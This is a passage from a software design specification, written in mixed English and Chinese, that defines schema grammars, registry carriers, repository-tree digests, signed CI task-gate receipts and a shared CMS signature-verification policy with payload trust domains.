`EXPLICIT_FIELDS_V1` is the escape hatch only for the 68 rows already frozen in the seed (Control platform contracts, approval, hold, disposition, search/import/export and security-incident components). Its `explicit_field_set` grammar is the ordered nonempty `field_name:TYPE:REQ|NULL` sequence separated by `;`; every other profile requires literal `NONE`. `REQ` is present/non-null and `NULL` is present but nullable. `ENUM(a|b|...)` is a closed unique enum with no default/unknown value. Scalar tokens have one definition: `ENTITY_ID`=lowercase RFC-4122 UUID, `SUBJECT_ID`=NFC canonical identifier matching `^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$`, `ROW_VERSION`/`U64_POS`=integer `1..2^63-1`, `U64`=`0..2^63-1`, `U8_0_8`=`0..8`, `U32_1_200`=`1..200`, `U32_1_14400`=`1..14400`, `SHA256`=64 lowerhex, `UTC`=RFC3339 UTC whole-second, `SEMVER`=canonical SemVer, `HTTPS_ORIGIN`=lowercase-host HTTPS origin with no userinfo/path/query/fragment, `CURSOR`=canonical unpadded base64url `1..1024` bytes, `STATE_CODE`=`^[A-Z][A-Z0-9_]{0,63}$`, `STATE_CODE_SET`=a byte-sorted unique array of 0..64 exact state-domain members, and `STRING_1_N`=NFC string of 1..N Unicode scalars. `ACTION_CODE` is lowercase dot-separated segments matching `^[a-z][a-z0-9_]{0,31}(\.[a-z][a-z0-9_]{0,31}){1,7}$`; `OBJECT_CODE|FIELD_CODE` are NFC lower-snake identifiers `1..64`; their `*_SET` forms are byte-sorted/unique and nonempty. `EVIDENCE_KIND_SET` uses the closed enum `TEST_RESULT|LANE_RESULT|AUDIT_CHECKPOINT|FILE_SCAN|BACKUP_CHECKPOINT|RESTORE_CERTIFICATION|EXTERNAL_RECEIPT|SECURITY_INCIDENT` and is byte-sorted/unique. `PUBLISHED_ATTACHMENT_REF` is exactly `{object_id,version_id}`. `OBJECT_REF` is exactly `{object_type,object_id,object_version}` (legal entity comes only from verified server context), `EVIDENCE_REF` is exactly `{evidence_id,evidence_sha256}`, `POLICY_REF` is exactly `{policy_id,policy_version,policy_sha256}`, and all reference sets sort/unique by their complete canonical tuple.

The AST/helper tokens are equally closed. `QUERY_AST|FILTER_AST` use exact `LEAF={kind:"LEAF",field_id,operator,value}` while `SCOPE_AST` uses exact `LEAF={kind:"LEAF",object_code,field_code,operator,value}`；all three share `AND|OR={kind,children}` and `NOT={kind,child}`. Depth is `<=8`, node count `<=256`, AND/OR children are canonical-digest-sorted unique with 2..32 entries, and NOT has exactly one child. A configured query/filter field exact-joins its `F57ConfiguredSchemaRefV1`; `SearchDefinitionPublishRequestV1.query_ast`/field sets exact-join the Task 10 relational registry version named by its `schema_version`; `AuthorizedSearchRequestV1.filter`/sort exact-join the immutable stored `(definition_id,definition_version)`；a `SCOPE_AST` object/field pair exact-joins the Task 10 platform object/field registry at the verified command-envelope generation. Thus an explicit row with `config_schema=NONE` still has one deterministic registry binding and cannot admit a free field. `operator` is exactly `EQ|NE|LT|LE|GT|GE|IN|NOT_IN|CONTAINS|STARTS_WITH|IS_NULL|IS_NOT_NULL`; `value` is required typed `F57ConfiguredValueV1` for all but `IS_NULL|IS_NOT_NULL`, where it is required JSON null；IN/NOT_IN require a nonempty LIST of one scalar kind. `SORT_SPEC_SET` items are exactly `{field_id,direction:"ASC"|"DESC",nulls:"FIRST"|"LAST"}` sorted/unique by field ID, and `FIELD_ID_SET` is a byte-sorted unique list of fields from the same joined registry.

`GRANT_CONDITION_SET` is a canonical-digest-sorted unique array of 0..64 strict oneOf rows: `TIME_WINDOW={kind:"TIME_WINDOW",valid_from,valid_until}`、`AMOUNT_CEILING={kind:"AMOUNT_CEILING",currency,minor_units}`、`OBJECT_STATE={kind:"OBJECT_STATE",object_code,allowed_states}` or `FIELD_PREDICATE={kind:"FIELD_PREDICATE",object_code,field_code,operator,value}`；time must increase, currency/minor-units use the exact MONEY rules, and object/field/state/operator/value exact-join the same generation-bound platform registry. `DEVICE_CONSTRAINT` is exactly `{allowed_states,minimum_assurance,managed_required}` with nonempty byte-sorted `allowed_states⊆{COMPLIANT,PENDING,RESTRICTED}` (never REVOKED), `minimum_assurance=SOFTWARE|HARDWARE_BACKED|MANAGED_HARDWARE_BACKED` and boolean `managed_required`. `OBJECTIVE_REOPEN_TRIGGER` and `OBJECTIVE_TERMINATION_REASON` are uppercase `STATE_CODE` scalars that must respectively exact-join the current objective kind's `reopen_trigger_kinds[]` and expanded `termination_rules[].reason_code` in the immutable 15-row Task 1 objective-definition artifact；the request's objective ID/cycle and evidence/impact digest must bind that same row. `DISPOSITION_METHOD=DELETE_UNREFERENCED|PSEUDONYMIZE|CRYPTO_ERASE|RETAIN_TOMBSTONE|DENY_IMMUTABLE`。No caller string can extend any of these registries.

Incident enums are closed: source=`PORTAL_CREDENTIAL_REUSE|MALWARE|IDENTITY_COMPROMISE|PROVIDER_COMPROMISE|BACKUP_INTEGRITY|MANUAL_REPORT`; severity=`LOW|MEDIUM|HIGH|CRITICAL`; category=`CREDENTIAL|MALWARE|DATA_INTEGRITY|AVAILABILITY|SUPPLY_CHAIN|POLICY`; notification=`CUSTOMER|REGULATOR|INTERNAL_EXECUTIVE`; rotation=`ACCOUNT_CREDENTIAL|CERTIFICATE|SIGNING_KEY|DATA_KEY|BACKUP_KEY|PROVIDER_SECRET`; milestone kind=`DETECTED|TRIAGED|CONTAINED|ERADICATION_STARTED|RECOVERY_STARTED|RECONCILIATION_STARTED|RELEASE_APPROVED|NOTIFICATION_RECORDED|CLOSED`; evidence kind=`AUDIT_CHECKPOINT|FILE_SCAN|IDENTITY_EVENT|PROVIDER_ATTESTATION|BACKUP_CHECKPOINT|RESTORE_RESULT|ROTATION_RECEIPT|NOTIFICATION_RECEIPT|EXTERNAL_DOCUMENT`。Incident transition/milestone/evidence sequence tokens expand to strict rows `{from_state,to_state,occurred_at,evidence_ref}`、`{milestone_kind,state,recorded_at,evidence_refs}` and `{evidence_id,evidence_sha256,evidence_kind,recorded_at}` respectively; transition/state values must belong to Task 24's incident graph and sequences sort by `(occurred_at|recorded_at,canonical row digest)` without duplicates. Unknown token, malformed field set, duplicate field, nullable drift or nested helper with an unknown field fails.

The checker expands a seed row to canonical JSON Schema 2020-12 with `additionalProperties:false` at every object, then computes `canonical_schema_sha256=SHA-256("EP-F57-COMPONENT-JSON-SCHEMA-V1\0" || JCS(schema))`。Only afterward may the due public `#[serde(deny_unknown_fields)]` Rust type exact-join by case-sensitive schema name, owner task and canonical schema digest; Rust cannot add, remove, rename or retype a field and cannot generate the expected schema. OpenAPI and TypeScript are generated from that same seed expansion, not from Rust. An absent due type, two Rust types for one name, handwritten divergent OpenAPI/TypeScript, omitted-vs-null drift, API-only field or reused name with two shapes fails.

The stored due projection is strict `ComponentShapeRegistryV1={schema_version:1,purpose:"EP-F57-COMPONENT-SHAPE-REGISTRY-V1",task_id,phase,repository_tree_sha256,api_discriminator_seed_sha256,api_component_shape_seed_sha256,api_component_state_domain_seed_sha256,api_state_domain_seed_sha256,row_count,rows}`；each row is exactly `{schema_name,component_kind,owner_task,shape_profile,subject_id_field,item_ref,config_schema,explicit_field_set,state_domain,canonical_schema_sha256,rust_type_path}`，where `state_domain` is the exact mapped token or JSON null for a shape with no state/filter, and rows use the shape seed sort. PRE_RED contains owners strictly before the selected task；POST_GREEN contains owners through it. Its fixed path is `target/f57-ci-evidence/task-gates/F57-NN/<pre-red|post-green>.component-shapes.v1.json` and `component_shape_registry_sha256=SHA-256("EP-F57-COMPONENT-SHAPE-REGISTRY-V1\0" || JCS(payload))`。`f57check` always validates all 638 shape rows plus the complete component-state/domain seeds structurally, but requires Rust/OpenAPI/TypeScript materialization only for this due projection. Thus Task 1 stores a valid `rows=[]` payload without future types, while Task 25 stores and exact-verifies all 638 rows with every mapped enum. Missing stored payload, wrong phase/task/tree/any seed digest, future/omitted row, state-domain substitution, digest substitution or any owner-code-derived expected field fails. `docs/evidence/f57-component-shape-registry.schema.json` is the strict schema for this carrier.

Direct routes have a parallel stored due carrier `DirectRouteRegistryV1={schema_version:1,purpose:"EP-F57-DIRECT-ROUTE-REGISTRY-V1",task_id,phase,repository_tree_sha256,plan_sha256,api_direct_route_seed_sha256,route_row_count,component_row_count,route_rows,component_rows}`。`route_rows` reproduce all eleven seed fields, including the literal complete `error_code_set`, in seed order for owners due in the phase；`component_rows` are sorted by `(schema_name,component_kind)` and exact `{schema_name,component_kind,owner_task,route_refs,route_shape_profiles,canonical_schema_sha256,rust_type_path}` from the closed direct-profile expansion, with both arrays byte-sorted/unique/nonempty. PRE_RED/POST_GREEN use the same owner cut rule as component shapes；shared components belong to their lowest owner and later routes exact-ref their existing digest. Fixed path is `target/f57-ci-evidence/task-gates/F57-NN/<pre-red|post-green>.direct-routes.v1.json` and `direct_route_registry_sha256=SHA-256("EP-F57-DIRECT-ROUTE-REGISTRY-V1\0" || JCS(payload))`。Task 1 stores zero/zero rows, Task 16 materializes Control, Task 18 adds Employee, Task 22 reaches all 47 routes/111 components, and Task 25 re-verifies the full carrier. Missing/extra route or component, wrong task/phase/tree/plan/seed/profile/security/schema triple/error enum/digest/Rust path, singular-profile overwrite or any reused component whose per-occurrence expansion differs fails. `docs/evidence/f57-direct-route-registry.schema.json` is its strict schema and is listed in Task 1 **Files**.

Each due seed-named `error_schema` is generated, never handwritten, as the matching shared profile plus its row's `operation_error_code` only when that value is not `NONE`. Shared profiles use only existing canonical registered codes and are exact byte-sorted sets: `CONTROL_COMMAND={PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.AUTHZ.REAUTH_REQUIRED,PLATFORM.AUTHZ.SOD_VIOLATION,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.CONCURRENCY.STALE_VERSION,PLATFORM.IDEMPOTENCY.IN_PROGRESS,PLATFORM.IDEMPOTENCY.PAYLOAD_MISMATCH,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`；`CONTROL_QUERY={PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`；`EMPLOYEE_COMMAND={PLATFORM.APPROVAL.REQUIRED,PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.AUTHZ.REAUTH_REQUIRED,PLATFORM.AUTHZ.SOD_VIOLATION,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.CONCURRENCY.STALE_VERSION,PLATFORM.IDEMPOTENCY.IN_PROGRESS,PLATFORM.IDEMPOTENCY.PAYLOAD_MISMATCH,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`；`EMPLOYEE_QUERY={PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`；`PORTAL_COMMAND={PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.CONCURRENCY.STALE_VERSION,PLATFORM.IDEMPOTENCY.IN_PROGRESS,PLATFORM.IDEMPOTENCY.PAYLOAD_MISMATCH,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`；`PORTAL_QUERY={PLATFORM.AUTHZ.NOT_FOUND_OR_DENIED,PLATFORM.AUTHZ.OBJECT_FORBIDDEN,PLATFORM.CAPACITY.CONCURRENCY_LIMIT,PLATFORM.CLIENT.GENERATION_INCOMPATIBLE,PLATFORM.LICENSE.RESTRICTED,PLATFORM.REQUEST.INVALID_PAYLOAD,PLATFORM.SYSTEM.NOT_READY}`。HTTP status/message/retryability mapping remains the central `docs/error-codes.md` row for each exact member. A `NONE` string entering an enum, an unregistered/alias/extra code, a command-only code in a query, a shared family alias or a default/unknown enum fails before generation.

A future target may be `PLANNED` only when its exact path is a `Create` entry under that same later task in this plan. PRE_RED requires every target due before the selected task to exist/compile/pass and allows targets first due in the selected task to remain absent or failing；POST_GREEN includes the selected task and requires its exact result/evidence manifest. Fail on seed/generated divergence, manual generated-file edits, duplicate/missing IDs, wildcard/range ownership, a due/nonplanned nonexistent target, an unregistered future path or evidence status beyond the recorded result for that exact TestID. Thus Task 1 can pass without placeholder tests for later tasks, while no owner task or final gate can pass on a merely planned due target.

`GatePhase` is the closed enum `PRE_RED | POST_GREEN`. A successful task check atomically writes a strict JSON envelope under `target/f57-ci-evidence/task-gates/F57-NN/pre-red.json` or `post-green.json`；partial/temp files are renamed only after signature verification. The signed payload is `F57TaskGateReceiptPayloadV1` with exact fields: `schema_version=1`、`purpose="EP-F57-TASK-GATE-RECEIPT-V1"`、`task_id`、`phase`、`repository_tree_sha256`、`plan_sha256`、`ownership_seed_sha256`、`legacy_migration_seed_sha256`、`api_discriminator_seed_sha256`、`api_component_shape_seed_sha256`、`api_component_state_domain_seed_sha256`、`api_state_domain_seed_sha256`、`api_direct_route_seed_sha256`、`fresh_pg_profile_seed_sha256`、`ci_stage_registry_seed_sha256`、`ci_lane_profile_seed_sha256`、`required_requirement_ids[]`（sorted/unique）、`registry_snapshot_sha256`、`component_shape_registry_sha256`、`direct_route_registry_sha256`、`due_target_manifest_sha256`、`task_runner_toolchain_manifest_payload_sha256`（both phases required）、`execution_context_sha256`（POST_GREEN required；PRE_RED null）、`test_result_manifest_sha256`（POST_GREEN required；PRE_RED null）、`fresh_pg16_evidence_sha256`（database-bearing POST_GREEN required；otherwise null）、`platform_lane_evidence_refs[]`、`checker_binary_sha256`、`ci_trust_bundle_sha256`、`checked_at_utc` and `outcome=PASS`。The task-runner toolchain is the runner that creates/verifies the receipt（for a four-platform task, `evidence-aggregate`）；all execution-lane toolchain payload digests remain separately exact-bound through lane evidence and the task-level execution context, so this singular field never pretends to represent the matrix. PRE_RED 固定 `execution_context_sha256=test_result_manifest_sha256=fresh_pg16_evidence_sha256=null` 且 `platform_lane_evidence_refs=[]`，只验证 signed task-runner toolchain、静态 registry/target/profile 状态；POST_GREEN 的 lane refs 才按 task-specific profile row 排序并满足 exact artifact set。The stored artifact is exactly `SignedBusinessArtifactV1<F57TaskGateReceiptPayloadV1>` with F-56's four outer fields `payload,payload_sha256,signer_subject,signature_cms_b64url`；`payload_sha256=SHA-256(JCS(payload))` and detached CMS content is exactly `JCS(payload)`。No digest or signature field is inside the payload, so no self-reference exists. The verifier uses the payload-bound CI bundle digest plus the pinned CI trust bundle and never accepts a caller-provided PASS/verdict.

All evidence uses one cross-platform repository-tree preimage. A formal gate requires Git index and tracked working tree byte-identical (`git diff` and `git diff --cached` both empty), no unmerged index entry, no submodule (`160000`) and no non-ignored untracked path；ignored build output is outside the manifest and may exist only under repository-declared ignore rules. Enumerate stage-0 tracked index entries, reject non-UTF-8、non-NFC、backslash/`.`/`..` components and Unicode case-fold collisions, and accept modes only `100644|100755|120000`. For each entry read the exact indexed blob from Git—not checkout bytes—and emit `RepositoryTreeEntryV1={path,mode,size_bytes,blob_sha256}`；symlink blob bytes are its link target, executable mode remains distinct. Sort by normalized path UTF-8 bytes. `F57RepositoryTreeManifestV1` exact fields are `{schema_version:1,purpose:"EP-F57-REPOSITORY-TREE-MANIFEST-V1",entries}` and `repository_tree_sha256=SHA-256("EP-F57-REPOSITORY-TREE-V1\0" || JCS(manifest))`。This is independent of Git SHA-1/SHA-256 object format and checkout CRLF conversion. Write exact JCS to `target/f57-ci-input/repository-tree/manifest.v1.json`; all lanes must recompute the same digest before running. Dirty tracked bytes、staged-only change、untracked source、case/NFC collision、mode/symlink mutation、submodule or any excluded output entering the index fails. Windows/macOS golden tests exact-compare LF/CRLF checkout、executable and symlink fixtures.

The receipt's registry/due-target/component/direct-route digests are stored payloads, not opaque claims. `F57RegistrySnapshotV1` exact fields are `{schema_version:1,purpose:"EP-F57-REGISTRY-SNAPSHOT-V1",repository_tree_sha256,generation,entries}`；entries are sorted by `registry_id` and exact `{registry_id,path,status,row_count,raw_sha256,semantic_sha256}` for the closed 22-entry roster `TASK_OWNERSHIP_SEED|LEGACY_MIGRATION_SEED|API_DISCRIMINATOR_SEED|API_COMPONENT_SHAPE_SEED|API_COMPONENT_STATE_DOMAIN_SEED|API_STATE_DOMAIN_SEED|API_DIRECT_ROUTE_SEED|FRESH_PG_PROFILE_SEED|CI_STAGE_REGISTRY_SEED|CI_LANE_PROFILE_SEED|MIGRATION_RESERVATIONS|GENERATED_TASK_MANIFEST|GENERATED_LEGACY_DISPOSITION|DEFERRED_REGISTRY|DEFERRED_ALIASES|OBJECTIVE_DEFINITIONS|ERROR_CODES|EVENT_CATALOG|METRICS_CATALOG|IMPACT_CATALOG|MIGRATION_CATALOG|OPENAPI_INDEX`. Their exact API paths/row counts are `docs/f57-api-discriminators.seed.tsv=437`、`docs/f57-api-component-shapes.seed.tsv=638`、`docs/f57-api-component-state-domains.seed.tsv=218`、`docs/f57-api-state-domains.seed.tsv=65` and `docs/f57-api-direct-routes.seed.tsv=47`; these literals must equal the strict parser's counts and cannot be inferred only from EOF. `raw_sha256` is exact file bytes；`semantic_sha256=SHA-256("EP-F57-REGISTRY-SEMANTIC-V1\0" || UTF8(registry_id) || 0x00 || JCS(the strict parsed rows/object))`；status and row_count come from that parser, never prose search. `F57DueTargetManifestV1` exact fields are `{schema_version:1,purpose:"EP-F57-DUE-TARGET-MANIFEST-V1",task_id,phase,repository_tree_sha256,plan_sha256,ownership_seed_sha256,rows}` with rows sorted by RequirementID and exact `{requirement_id,owner_task,activation_task,test_id,test_target_path,test_symbol,adapter,due_state}`；`due_state` is `PRIOR_REQUIRED|SELECTED_RED_ALLOWED|SELECTED_GREEN_REQUIRED` as determined solely by task/phase. JCS payloads are atomically stored beside the receipt as `registry-snapshot.v1.json` and `due-target-manifest.v1.json`; receipt digests are respectively `SHA-256("EP-F57-REGISTRY-SNAPSHOT-V1\0" || JCS(payload))` and `SHA-256("EP-F57-DUE-TARGET-MANIFEST-V1\0" || JCS(payload))`. Missing stored payload、unknown/omitted registry、wrong row count/status/due state、digest substitution or a receipt referring to another task/tree fails independent verification.

`plan_sha256`、`ownership_seed_sha256`、`legacy_migration_seed_sha256`、`api_discriminator_seed_sha256`、`api_component_shape_seed_sha256`、`api_component_state_domain_seed_sha256`、`api_state_domain_seed_sha256`、`api_direct_route_seed_sha256`、`fresh_pg_profile_seed_sha256`、`ci_stage_registry_seed_sha256` and `ci_lane_profile_seed_sha256` are SHA-256 of the exact repository file bytes (no newline or Unicode rewriting). `checker_binary_sha256` and `runner_binary_sha256` are SHA-256 of the raw bytes at the already-resolved absolute executable path actually launched；the path and digest also enter `F57ExecutionContextV1`. No caller-provided digest is accepted.

Task 1 前移并建立全仓唯一 `crates/foundation/src/signature.rs`；Task 2 及以后只能消费它，禁止在 xtask、package、provider 或 release 另写 verifier。它定义 strict lowerhex `Sha256Digest`、canonical-no-padding `CanonicalBase64UrlBytes`、四字段 `SignedBusinessArtifactV1<T>`、`BusinessArtifactPayloadV1::{PURPOSE,embedded_purpose,cms_signing_time}`、`CmsSigningKeyV1::{algorithm,certificate_chain_der,sign_sha256}`、`sign_business_artifact_v1`，以及唯一 public bytes ingress `parse_and_verify_business_artifact_v1<T: DeserializeOwned + BusinessArtifactPayloadV1>(exact_utf8:&[u8],policy:&CmsVerificationPolicyV1)`；接收已解析 object 的低层 verifier 只能 `pub(crate)`。bytes ingress 先强制 outer UTF-8 JSON 最大 4,194,304 bytes、UTF-8/no-BOM、duplicate/unknown/missing reject，再强制 `JCS(payload) <= 1,048,576` bytes；`signature_cms_b64url` 在分配前先拒绝 encoded length 大于 1,398,102，canonical decode 后单一 DER `ContentInfo <= 1,048,576` bytes，`trust_bundle_der <= 1,048,576` bytes。更小的 payload 类型上限只能由该类型 schema 另行收窄，不能缩小共享 F-56/F-57 envelope 上限；这样既挡住 whitespace/base64 分配型 DoS，也不误拒 F-56 两个独立 1 MiB 上限均合法的 artifact。随后执行 RFC 8785 JCS/digest、canonical base64url、CMS/chain/CRL；xtask、runtime、release 与 profile-chain decoder 都复用这些 newtype/入口，不能先用宽松 JSON/base64 parser。`CmsVerificationPolicyV1` exact inputs 为 `trusted_now,expected_purpose,expected_trust_bundle_sha256,allowed_signer_subjects,trust_bundle_der`。实现逐字复用 F-56 detached CMS、`spki-sha256:<64 lowerhex>`、`ECDSA_P256_SHA256|RSA_PSS_SHA256`、唯一离线链和 global-highest-then-cover full base CRL；拒绝 OS root、AIA/网络、caller root、raw signature、OpenSSL CLI/library fallback 或“验签未判定当通过”。现有 `xtask/src/sign.rs` 裸 ECDSA/OpenSSL package gate 不得被任何 F-57 evidence path 调用。

CMS `signingTime` 必须等于下表 payload 字段的同一 UTC whole-second；没有表内映射的 payload 不能实现 `BusinessArtifactPayloadV1`，也不能进入共享 signer/verifier。`embedded_purpose()` 必须逐字返回 payload 自身 `purpose`；trait 常量、payload 字段、verification policy 三者不等即在验链前拒绝。

| Payload type | `PURPOSE` / payload `purpose` | `cms_signing_time()` | Trust domain / producing task |
|---|---|---|---|
| `F57ToolchainExecutionManifestV1` | `EP-F57-TOOLCHAIN-EXECUTION-MANIFEST-V1` | `issued_at` | CI toolchain roster / Task 1 |
| `F57TaskGateReceiptPayloadV1` | `EP-F57-TASK-GATE-RECEIPT-V1` | `checked_at_utc` | CI task-gate roster / Task 1 |
| `F57TaskGateManifestPayloadV1` | `EP-F57-TASK-GATE-MANIFEST-V1` | `created_at_utc` | CI aggregate roster / Task 1 |
| `F57LaneEvidencePayloadV1` | `EP-F57-LANE-EVIDENCE-V1` | `finished_at_utc` | CI lane-evidence roster / Task 1 |
| `F57AuthorityStorageManifestPayloadV1` | `EP-F57-AUTHORITY-STORAGE-MANIFEST-V1` | `issued_at` | customer deployment trust roster / Task 2 |
| ADR-0020 `DataKeyRecoveryManifestPayloadV1` | `EP-F57-DATA-KEY-RECOVERY-MANIFEST-V1` | `requested_at` | application-recovery approval roster / Task 2 |
| ADR-0020 `ApplicationRecoveryDomainManifestPayloadV1` | `EP-F57-APPLICATION-RECOVERY-DOMAIN-MANIFEST-V1` | `issued_at` | application-recovery-domain roster / Task 2 |
| ADR-0020/0024 `BackupRecoveryDomainManifestPayloadV1` | `EP-F57-BACKUP-RECOVERY-DOMAIN-MANIFEST-V1` | `issued_at` | independent backup-recovery-domain roster / Task 24 |
| `SignedGenerationPayloadV1` | `EP-F57-SIGNED-GENERATION-V1` | `issued_at` | release/config-generation roster / Task 9 |
| `CapabilityPackageManifestPayloadV1` | `EP-F57-CAPABILITY-PACKAGE-MANIFEST-V1` | `issued_at` | product or approved customer package roster / Task 13 |
| ADR-0023 `ProviderManifestV1` | `EP-F57-PROVIDER-MANIFEST-V1` | `issued_at` | active package/provider roster / Task 14 |
| ADR-0023 `ResourceGrantV1` | `EP-F57-RESOURCE-GRANT-V1` | `issued_at` | authority runtime-grant roster / Task 14 |
| `ClientStackDecisionPayloadV1` | `EP-F57-CLIENT-STACK-DECISION-V1` | `finished_at_utc` | CI client-certification roster / Task 17 |
| `ClientDistributionCertificationPayloadV1` | `EP-F57-CLIENT-DISTRIBUTION-CERTIFICATION-V1` | `issued_at` | product/client-certification roster / Task 17 |
| ADR-0024 `BackupKeyEnvelopeV1` | `EP-F57-BACKUP-KEY-ENVELOPE-V1` | `created_at` | independent backup-checkpoint roster / Task 24 |
| `P340SoakEvidencePayloadV1` | `EP-F57-P340-SOAK-EVIDENCE-V1` | `finished_at_utc` | production-capacity evidence roster / Task 24 |
| `F57ReleaseEvidencePayloadV1` | `EP-F57-RELEASE-EVIDENCE-V1` | `issued_at` | release-evidence roster / Task 25 |
| F-56 `LicenseGrantPayloadV1` | `EP-LICENSE-GRANT-V1` | `issued_at` | F-56 license roster / compatibility adapter |
| F-56 `LicenseRevocationPayloadV1` | `EP-LICENSE-REVOCATION-V1` | `issued_at` | F-56 license roster / compatibility adapter |
| F-56 `ModulePackageManifestV1` | `EP-MODULE-PACKAGE-V1` | `issued_at` | F-56 license/module roster / compatibility adapter |

表中 trust domain 是互不替代的授权集合；能链到另一个 domain 的 root 不构成授权。F-56 三类 payload 保留其既有 wire bytes、purpose、大小、roster 和错误语义，只增加调用共享 trait/verifier 的零变更 adapter；不得重序列化或改名。Task 1 的 `f57_evidence_signing` 只负责前四个已存在的 CI payload 映射与 recovery-domain strict schema；各后续 owner task 在其 payload 创建时添加 trait implementation、purpose/time/trust-domain 正反例。Task 2 必须覆盖 storage manifest、ADR-0020 recovery approval manifest 与 APPLICATION recovery-domain manifest 三个互不替代的映射；Task 24 添加独立严格的 `BackupRecoveryDomainManifestPayloadV1` wrapper，共享 recovery-domain descriptor 但使用互不替代的 BACKUP purpose 与独立 roster；Task 9/13/14/17/25 分别覆盖自己行。最终 Task 25 扫描 registry 与所有 `SignedBusinessArtifactV1<...>` 使用点 exact-equal，漏项、重复 purpose、wrapper/purpose 不一致或跨域 trust policy 都失败。

链/profile/每张证书（含 anchor）须在 `signingTime` 有效；对每个实际 issuer 的 global-highest full base CRL 只须唯一覆盖一次捕获的 `trusted_now`，完成全链 registry 后才扫 serial；non-anchor 在 `trusted_now` 的有效期只参与 ACTIVE/RETIRED 分类，新签 artifact 的整条 non-anchor 链必须 ACTIVE。Toolchain 固定 `signingTime==issued_at<expires_at` 且 `issued_at<=trusted_now<=expires_at`；receipt/aggregate/lane 不允许未来时间或跨运行重签。CLI 的 `F57CheckContext={signer,verifier,now}` 只由固定 CI adapter 构造，测试使用注入 fake/KAT；命令/body/环境不得提供 PASS、subject、signature、root、private-key path 或 `trusted_now`。Windows authority CLI 只在 W32Time 已同步、last-success source 命中下述 policy allowlist、reported offset 绝对值不大于 60 秒且进程 monotonic 未回退时构造 `WindowsCiTrustedTimeV1`；否则不产 evidence。

CI public policy 唯一为 repository-tracked `docs/evidence/f57-ci-signing-policy.toml`，解析后 strict fields 恰为 `schema_version=1,purpose="EP-F57-CI-SIGNING-POLICY-V1",generation,trust_bundle_sha256,time_source_ids[],authorization[]`；TOML 中每个 `[[authorization]]` exact 为 `{execution_lane,issuer_role,allowed_purposes,signer_subject,provider}`，按 `(execution_lane,issuer_role,signer_subject)` 排序唯一。`issuer_role` 只取 `F57_TOOLCHAIN_ATTESTER|F57_LANE_EVIDENCE_SIGNER|F57_TASK_GATE_SIGNER|F57_AGGREGATE_SIGNER`，production provider 只取 `WINDOWS_CNG_TPM_P256`；Apple/Android/其他 runner 不持有 CI CMS 私钥，Windows evidence authority 可依下述 native-measurement ceremony 为其 execution lane 签发 task/profile-bound manifest/evidence。ACTIVE/RETIRED/REVOKED 只由证书有效期和 full CRL 判定，不在 policy 中另造状态机；只有当前未撤销且时间有效的 exact purpose/execution-lane signer 可新签，历史验签按 F-56 chain/CRL 规则。schema 是 `docs/evidence/f57-ci-signing-policy.schema.json`；unknown key、重复/乱序、同 execution-lane/role/purpose 多授权或 purpose/lane 借用均拒绝。

Role-to-purpose 是不可配置闭集：`F57_TOOLCHAIN_ATTESTER→EP-F57-TOOLCHAIN-EXECUTION-MANIFEST-V1`、`F57_LANE_EVIDENCE_SIGNER→EP-F57-LANE-EVIDENCE-V1`、`F57_TASK_GATE_SIGNER→EP-F57-TASK-GATE-RECEIPT-V1`、`F57_AGGREGATE_SIGNER→EP-F57-TASK-GATE-MANIFEST-V1`。每个 authorization 的 `allowed_purposes` 必须恰为其 role 的单元素数组；多/少/交叉 purpose 都使整个 policy 无效。

Toolchain manifest 不由开发者手写，且 identity 是 `(task_id,logical_lane,execution_lane,lane_profile_id,repository_tree_sha256)`，不是一个 logical lane 共用一份工具链。CNG-capable runner 的唯一 administrator command forms 是 `cargo xtask f57-toolchain attest --task <F57-NN> --lane <execution-lane> --profile <lane-profile-id>` 与同参数的 `verify`；非 CNG native runner 只允许同参数的 `measure-native` 与 `verify`。task/lane/profile 必须 exact-join 25-row profile seed，其他参数、path、endpoint、subject、key、digest 或 output override 均拒绝。固定 manifest locator 为 `target/f57-ci-input/toolchains/<task_id>/<execution_lane>/<lane_profile_id>/manifest.v1.json`；启动该 execution lane 的任何 stage、test 或 build 前必须存在、验签、重测 PASS。

